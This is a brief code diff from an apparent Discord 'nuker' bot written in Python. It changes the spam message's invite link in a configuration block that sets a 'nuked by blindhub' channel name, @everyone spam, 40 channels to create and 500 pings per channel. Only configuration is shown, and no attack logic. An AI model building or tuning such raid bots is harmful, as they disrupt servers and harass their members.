@@ -6,7 +6,7 @@ import asyncio
 # Configuration
 prefix = "!"
 channel_name = "nuked by blindhub"
-spam_message = "@everyone NUKED BY BLINDHUB https://discord.gg/srUu6NmuTR "
+spam_message = "@everyone NUKED BY BLINDHUB https://discord.gg/blindhub "
 channels_to_create = 40
 pings_per_channel = 500
 
